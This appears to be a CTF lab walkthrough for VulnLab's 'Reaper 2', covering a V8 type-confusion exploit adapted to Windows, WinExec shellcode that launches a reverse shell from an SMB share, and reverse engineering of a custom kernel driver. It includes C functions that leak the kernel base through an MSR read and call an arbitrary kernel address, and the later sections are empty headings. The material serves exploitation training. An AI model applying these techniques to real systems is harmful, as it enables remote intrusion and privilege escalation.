# VulnLab Reaper 2 Walkthrough

## Introduction

[Reaper 2](https://www.vulnlab.com/machines) was the second lab recommended to me for my [OffSec Advanced Windows Exploitation (AWE)](https://www.offsec.com/courses/exp-401/) preperations. It was written by [xct](https://x.com/xct_de) and is part of the training and labs offered by [VulnLab](https://vunlab.com). The lab was rated **Insane** and it didn't dissapoint!

The [wiki](https://wiki.vulnlab.com/guidance/insane/reaper2) for the lab gives several clues that definitely helped me on my journey to pwning it.

In this post I'm going to do something a little different. I am not going to post any full exploit code, and I am not going to write about the way I defeated the lab. I am going to write about how I would take on the lab now I know everything I have learned. So, this isn't going to be a walthrough you can follow, copy and paste a few things and beat the lab. It will act as a guide on how you can approach the lab, and write your own exploits to get `SYSTEM` access to **Reaper 2**.

I will be showing how this can all be done **without** using the clues given in in the [wiki](https://wiki.vulnlab.com/guidance/insane/reaper2). I won't be going in to great detail, for example how to attach a kernel debugger. The intention is that you can use this walkthrough as a guide when you get stuck. Let's go!

## Initial Access

### Reconnaissance

As with most labs you can start with an `nmap` scan to see what services are running on the target:

```
nmap reaper2.vulnlab.local -Pn -p- 
...
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49668/tcp open  unknown
```

It's a Windows operating system, as expected. It has the **RPC** and **SMB** ports open and it also has a web service running on **HTTP**, and Terminal Services (**RDP**).

#### HTTP

Visiting the website we are presented with the following:

<img width="835" alt="Screenshot 2024-08-25 at 13 55 12" src="https://github.com/user-attachments/assets/91cf2196-e8a8-45e2-9890-b7c9250f3ea8">


From here we can input some JavaScript and the **V8** engine will process it and display the output. We can test this with an input of `print(version());`, and we will get an output of `12.2.0 (candidate)`. What is even more interesting is that if we look at the source code in the returned web page we will see:

```html
<!-- Completed: d8.exe --allow-natives-syntax --harmony-set-methods data.js -->
```

We have arbitrary JavaScript code input into **D8**. **D8** is a lightweight, standalone command-line interpreter for the **V8** JavaScript engine. It's primarily used for testing and debugging JavaScript code and **V8** itself. We also observe that the `--allow-natives-syntax --harmony-set-methods` arguments are being used.

#### SMB Shares

We should also enumerate the **SMB** shares on the target as these will help us to exploit the target.

```
 crackmapexec smb reaper2.vulnlab.local -u guest -p '' --shares
SMB         reaper2.vulnlab.local   445    REAPER2          [*] Windows 10.0 Build 20348 x64 (name:REAPER2) (domain:Reaper2) (signing:False) (SMBv1:False)
SMB         reaper2.vulnlab.local   445    REAPER2          [+] Reaper2\guest: 
SMB         reaper2.vulnlab.local   445    REAPER2          [+] Enumerated shares
SMB         reaper2.vulnlab.local   445    REAPER2          Share           Permissions     Remark
SMB         reaper2.vulnlab.local   445    REAPER2          -----           -----------     ------
SMB         reaper2.vulnlab.local   445    REAPER2          ADMIN$                          Remote Admin
SMB         reaper2.vulnlab.local   445    REAPER2          C$                              Default share
SMB         reaper2.vulnlab.local   445    REAPER2          IPC$            READ            Remote IPC
SMB         reaper2.vulnlab.local   445    REAPER2          software$       READ            software developement share
```

The `software$` looks interesting and we can connect to it using **smbclient**:

```
smbclient //reaper2.vulnlab.local/software$ 
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Apr 28 20:31:48 2024
  ..                                DHS        0  Mon Apr 29 14:01:57 2024
  kernel                              D        0  Sun Apr 28 13:26:32 2024
  v8_debug                            D        0  Thu May  9 20:33:23 2024
  v8_release                          D        0  Sun Apr 28 10:39:11 2024

		6126847 blocks of size 4096. 2388806 blocks available
```

We should download copies of all the files we find, this includes `v8_debug.zip`, `v8_release`, `d8.exe`, `snapshot_blob.bin`, and `kernel32.dll`. We cannot download `Reaper.sys` but don't worry about that for now.

These files have been provided by `xct` to make debugging and writing your exploit easier. The **V8** and **D8** files mean you don't have to build the environemnt yourself, and the `kernel32.dll` file will come in handy later when we need to use some Win32 API offsets.

### Type Confusion Bug

It turns out there is a documented [explanation and walkthrough](https://h0meb0dy-me.translate.goog/entry/Issue-1510709-Type-confusion-in-Harmony-Set-methods-leads-to-RCE?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp) of a **type confusion** bug in this version of **D8** whilst running with the `--harmony-set-methods` argument. The bad news for us is the walkthrough is written for **Linux**.

Our challenge at this point is to convert the exploit so it will run against a **Windows Server 2022** target.

I recommed you spend a bit of time disecting the exploit and understanding how it works, this will really help when it comes to writing your own shellcode.

### Exploitation

I found a useful blog by [Jake Halon](https://jhalon.github.io/chrome-browser-exploitation-1/) which explained some important **V8** concepts when I was trying to understand it's internals: such as **Pointer Tagging** and **Pointer Compression**.

We can use most of the exploit documented by `h0meb0dy` but we do need to make some changes.

The first thing we need to consider is the fake array used in the exploit uses a `PACKED_DOUBLE_ELEMENTS` mapping, the value for this is different on the target. To find this we can run the following code **on the target** (using the Reaper Calculator):

```
d8> a = [1.1];
[1.1]
d8> %DebugPrint(a);
DebugPrint: 000000870004D9C5: [JSArray]
 - map: [...]
```

The second change is we need to write shellcode that will run on **Windows**. Essentially we need to change the `let wasmCode = new Uint8Array([...` line.

This was a painful process because of the JIT compiler restrictions outlined by `h0meb0dy`.

Essentially I wrote my shellcode in chunks of 8 bytes:

```asm
locate_kernel32:
    xor rcx, rcx                    ; zero out rcx
    nop                             ;
    nop                             ;
    nop                             ;
    jmp 0x0f                        ;

    add rcx, 0x60                   ; the _PEB is at an offset of 0x60 from gs
    nop                             ;
    nop                             ;
    jmp 0x17                        ;

    mov rax, gs:[rcx]               ; rax = _PEB
    nop                             ;
    nop                             ;
    jmp 0x1f                        ; 
...
```

**Notice** the jump instructions, the reason for these are outlined in the blog, and also note that two chunks cannot be identical or they will be optimised (essentially removed from your shellcode). The jump gap changes at certain points along, you will need to detect these as you are debugging.

I wrote a **python** script to take my `asm` and convert it to `wasm` (in text format `wat`): [asm2wasm.py](https://github.com/plackyhacker/misc-scripts/blob/main/awe-prep/asm2wasm.py). It's a bit of a Frankenstein, but it worked for me.

It does some checks on my `asm`, it then compiles it using `nasm`, it formats the assembly into a JavaScript array and builds and executes the `shellcode.js` file to output the `wasm` code:

```wat
(module
  (func (export "main")
    f64.const 1.6305244900842146e-270
    f64.const 1.6305241091952572e-270
    f64.const 1.6305237735001968e-270
    f64.const 1.6305238535635708e-270
...
```

I then used the [wat2wasm demo website]([https://webassembly.github.io/wabt/demo/wasm2wat/](https://webassembly.github.io/wabt/demo/wat2wasm/)) to convert my `wat` code to a `wasm` file. We can enter our text and download the `wasm` file.

Then we can use the follow **python** script to get the JavaScript array for our exploit:

```python
with open('..\\test.wasm', 'rb') as f:
    wasmCode = f.read()

wasmCode_arr = []
for c in wasmCode:
    wasmCode_arr.append(c)

print(str(wasmCode_arr))
```

Essentially my shellcode does the following:

- Locates the base address of `kernel32`.
- Resolves `WinExec`, this is done by examining the `kernel32.dll` file and finding the offset of `WinExec` then adding it to the base of `kernel32`:

```asm
; r15 = base address of kernel32
resolve_winexec:
    mov ebx, [offset]               ; mov the offset of WinExec in to ebx
    nop                             ; 
    jmp 0x14                        ;

    add rbx, r15                    ; add kernel base to WinExec offset
    mov r14, rbx                    ; mov the address of WinExec in to r14
    jmp 0x1c                        ; this is to defeat the JIT restrictions
```

- Pushes a string on the stack. This is an **SMB** share on my Kali host, with a reverse shell executable.
- Calls `WinExec` using 64-bit calling conventions.

I set up a **SMB** share on my Kali host. I hosted a reverse shell and executed my final JavaScript exploit in the Reaper Calculator:

```
nc -nvlp 4443
listening on [any] 443 ...
connect to [10.8.2.195] from (UNKNOWN) [10.10.102.190] 49712
Microsoft Windows [Version 10.0.20348.2402]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

### Gathering Binaries

Now we are on the device we should take a copy of the custom driver `Reaper.sys` and `C:\Windows\System32\ntoskrnl.exe`. These can be copied to our **SMB** share on our Kali host.

We need the `Reaper.sys` file because it is a custom driver which we need to exploit to escalate our privileges and we need `ntoskrnl.exe` to find ROP gadgets to build a ROP chain.

## Privilege Escalation

**Note:** Our reverse shell from initial access is running at **Low Integrity**.

### Reverse Engineering

Our first step for privilege escalation is to reverse engineer the driver binary. We can load this in to **IDA Free**. We need to find the following:

- Symlink in order to communicate with the driver from user mode.
- Dispatch routine(s) to discover:
  - I/O Control Numbers to send data to the driver.
  - Possible vulnerailities.
 
Using **WinDbg** whilst debugging a target running the custom driver we can find the **dispatch routines** very easily:

```
1: kd> !drvobj \Driver\Reaper 2
Driver object (ffff828632002e30) is for:
 \Driver\reaper

DriverEntry:   fffff800161f5000	
DriverStartIo: 00000000	
DriverUnload:  fffff800161f1210	
AddDevice:     00000000	

Dispatch routines:
[00] IRP_MJ_CREATE                      fffff800161f1000	+0xfffff800161f1000
...
[0e] IRP_MJ_DEVICE_CONTROL              fffff800161f1020	+0xfffff800161f1020
```

The **Symlink** can be found in the **DriverEntry** function, and then following the link to the called function:

```
// lines 29 and 30
symLink = L"\\??\\Reaper";
v3 = IoCreateSymbolicLink(&SymbolicLinkName, &DeviceName);
```

We can now reverse engineer the `IRP_MJ_DEVICE_CONTROL` function using **IDA**, at offset `0x1020`. I have included my efforts below, including comments and the renaming of variales:

```c
NTSTATUS __fastcall ReaperDeviceControl(__int64 DeviceObject, __int64 Irp)
{
  __int64 CurrentStackLocation; // r9
  NTSTATUS status; // ebx
  int IoControlCode; // eax
  __int64 InputBuffer; // rsi
  _DWORD *PoolWithTag; // rax
  __int64 l_Irp; // [rsp+38h] [rbp+10h] BYREF


  // Local copy of the IRP
  l_Irp = Irp;

  // https://www.vergiliusproject.com/kernels/x64/windows-10/20h2/_IRP
  CurrentStackLocation = *(_QWORD *)(Irp + 0xB8);

  // STATUS_INVALID_DEVICE_REQUEST
  status = 0xC0000010;

  // https://www.vergiliusproject.com/kernels/x64/windows-10/20h2/_IO_STACK_LOCATION
  IoControlCode = *(_DWORD *)(CurrentStackLocation + 0x18);

  // IOCTL 0x80002003 does not execute this block
  if ( IoControlCode != 0x80002003 )
  {
    switch ( IoControlCode )
    {
      case 0x80002007:
        ExFreePoolWithTag(g_allocated_user_data, 'paeR');
MID_LABEL:
        status = 0;
        goto COMPLETE_REQUEST_LABEL;
      case 0x8000200B:

        // IOCTL 0x8000200B calls:
        // PsLookupThreadById
        // KeSetPriorityThread
        // ObfDereferenceObject
        status = PsLookupThreadByThreadId(*(unsigned int *)(g_allocated_user_data + 4), &l_Irp);
        if ( status >= 0 )
        {
          KeSetPriorityThread(l_Irp, *(unsigned int *)(g_allocated_user_data + 8));
          ObfDereferenceObject(l_Irp);

          // Whatever we put in buffer+16 will be called
          if ( *(_QWORD *)(g_allocated_user_data + 16) )
            _guard_dispatch_icall_fptr();
        }
        goto COMPLETE_REQUEST_LABEL;
      case 0x8000200F:

        // Only IOCTL 0x8000200F calls __readmsr
        **(_QWORD **)(g_allocated_user_data + 0x20) = __readmsr(*(_DWORD *)(g_allocated_user_data + 24));
        break;
      case 0x80002013:

        // IOCTL 0x80002013 only seems to call _writemsr - see below
        break;
      default:
        goto COMPLETE_REQUEST_LABEL;
    }

    // IOCTLs 0x8000200B, 0x8000200F, and 0x80002013 all call __writemsr 
    __writemsr(*(_DWORD *)(g_allocated_user_data + 0x18), **(_QWORD **)(g_allocated_user_data + 0x20));
  }

  // IOCTL 0x80002003 rejoins here

  // https://www.vergiliusproject.com/kernels/x64/windows-10/20h2/_IO_STACK_LOCATION
  // if InputBuffer == 0, status = 0xC000000D (STATUS_INVALID_PARAMETER)
  // otherwise status = 0xC0000010 (STATUS_INVALID_DEVICE_REQUEST)
  InputBuffer = *(_QWORD *)(CurrentStackLocation + 0x20);
  status = InputBuffer != 0 ? 0xC0000010 : 0xC000000D;

  // https://www.vergiliusproject.com/kernels/x64/windows-10/20h2/_IO_STACK_LOCATION
  // InputBufferLength is CurrentStackLocation + 0x10
  // Checks that the InputBufferLength is greater than 39
  if ( *(_DWORD *)(CurrentStackLocation + 0x10) < 40u )
    status = 0xC0000023;                        // STATUS_BUFFER_TOO_SMALL

  // Check MagicNumber
  if ( *(_DWORD *)InputBuffer == 0x6A55CC9E )
  {

    // Using NonPagedPool
    PoolWithTag = (_DWORD *)ExAllocatePoolWithTag(0LL, 40LL, 'paeR');
    g_allocated_user_data = (__int64)PoolWithTag;

    // Copies the InputBuffer into the Global Buffer
    if ( PoolWithTag )
    {

      // typedef struct ReaperData {
      //     DWORD Magic;            // userData + 0
      //     DWORD ThreadId;         // userData + 4
      //     DWORD Priority;         // userData + 8
      //     DWORD Padding;          // userData + 12
      //     QWORD unknown1;         // userData + 16
      //     DWORD msrRegister;      // userData + 24
      //     QWORD msrValue;         // userData + 32
      // } ReaperData;
      *PoolWithTag = *(_DWORD *)InputBuffer;    // +0x0 = MagicNumber
      *(_DWORD *)(g_allocated_user_data + 8) = *(_DWORD *)(InputBuffer + 8);// ThreadPriority
      *(_DWORD *)(g_allocated_user_data + 4) = *(_DWORD *)(InputBuffer + 4);// ThreadId
      *(_QWORD *)(g_allocated_user_data + 16) = *(_QWORD *)(InputBuffer + 16);// cfgCheck?
      *(_DWORD *)(g_allocated_user_data + 24) = *(_DWORD *)(InputBuffer + 24);// msrRegister
      *(_QWORD *)(g_allocated_user_data + 32) = *(_QWORD *)(InputBuffer + 32);// msrValue
      goto MID_LABEL;
    }
  }
COMPLETE_REQUEST_LABEL:

  // Irp->IoStatus.Status = status;
  *(_DWORD *)(Irp + 48) = status;

  // Irp->IoStatus.Information = 0;
  *(_QWORD *)(Irp + 56) = 0LL;
  IofCompleteRequest(Irp, 0LL);
  return status;
}
```

The interesting parts are:

```c
// lines 46 and 47
// IOCTL 0x8000200B
// Whatever we put in buffer+16 will be called
if ( *(_QWORD *)(g_allocated_user_data + 16) )
  _guard_dispatch_icall_fptr();
...
// line 53
// Only IOCTL 0x8000200F calls __readmsr
**(_QWORD **)(g_allocated_user_data + 0x20) = __readmsr(*(_DWORD *)(g_allocated_user_data + 24));        
```

Lines `46` and `47` allow us to execute code at an address we pass in our buffer at an offset of `16` bytes. This is good but the target Kernel is running **kASLR** and **DEP** so we need to run Kernel code and we need a Kernel address disclosure in order to do this.

Line `53` allows us to read a model-specific register (MSR). The register `0xC0000082` is the `IA32_LSTAR` register and points to the **syscall** function, which is at an offset of Kernel base. Effectively if you can read this, then you can work out what the base address of the kernel is on your target OS:

```
1: kd> ?nt!KiSystemCall64Shadow - nt
Evaluate expression: 11055488 = 00000000`00a8b180
```

**Note:** On the target you will need to find the offset of `KiSystemServiceHandler`. It is a pain, but it can be done.

### Kernel Base Address Disclosure Bug

We can exploit the Kernel address disclosure bug using the following function:

```c
QWORD ReadMSR(HANDLE hDevice, DWORD msr)
{
    ReaperData userData;
    QWORD outputOfMSR = 0x0;

    userData.Magic = 0x6a55cc9e;
    userData.ThreadId = GetCurrentThreadId();
    userData.Priority = 0;
    userData.Padding = 0x41414141;
    userData.unknown1 = 0x0;
    userData.msrRegister = msr;
    userData.msrValue = (QWORD)&outputOfMSR;
    memset(&userData.MaliciousBuffer, 0x41, 0x10);

    unsigned char outputBuf[1024];
    memset(outputBuf, 0, sizeof(outputBuf));
    ULONG bytesRtn;

    // allocate
    BOOL result = DeviceIoControl(hDevice, IOCTL_ALLOCATE, (LPVOID)&userData, (DWORD)sizeof(struct ReaperData), outputBuf, 1024, &bytesRtn, NULL);

    // read msr
    memset(outputBuf, 0, sizeof(outputBuf));
    result = DeviceIoControl(hDevice, IOCTL_READMSR, (LPVOID)&userData, (DWORD)sizeof(struct ReaperData), outputBuf, 1024, &bytesRtn, NULL);

    // Free pool memory
    memset(outputBuf, 0, sizeof(outputBuf));
    result = DeviceIoControl(hDevice, IOCTL_FREE, (LPVOID)NULL, (DWORD)0, outputBuf, 1024, &bytesRtn, NULL);

    return outputOfMSR;
}
```

This gives us a Kernel base address with which to defeat **kASRL**. The execute bug is similar, although we use a different IOCTL and pass the address of the code we want to execute in the user buffer:

```c
void ExecuteGadget(HANDLE hDevice, QWORD address)
{
    ReaperData userData;

    userData.Magic = 0x6a55cc9e;
    userData.ThreadId = GetCurrentThreadId();
    userData.Priority = 0;
    userData.Padding = 0x41414141;
    userData.unknown1 = address;
    userData.msrRegister = 0x41414141;
    userData.msrValue = 0x4242424242424242;
    memset(&userData.MaliciousBuffer, 0x41, 0x10);

    unsigned char outputBuf[1024];
    memset(outputBuf, 0, sizeof(outputBuf));
    ULONG bytesRtn;

    // allocate
    BOOL result = DeviceIoControl(hDevice, IOCTL_ALLOCATE, (LPVOID)&userData, (DWORD)sizeof(struct ReaperData), outputBuf, 1024, &bytesRtn, NULL);

    // execute code
    memset(outputBuf, 0, sizeof(outputBuf));
    result = DeviceIoControl(hDevice, IOCTL_EXECUTE_GADGET, (LPVOID)&userData, (DWORD)sizeof(struct ReaperData), outputBuf, 1024, &bytesRtn, NULL);

    // Free pool memory
    memset(outputBuf, 0, sizeof(outputBuf));
    result = DeviceIoControl(hDevice, IOCTL_FREE, (LPVOID)NULL, (DWORD)0, outputBuf, 1024, &bytesRtn, NULL);
}
```



### Arbitrary Code Execution Bug

### Kernel Debugging

### Exploitation
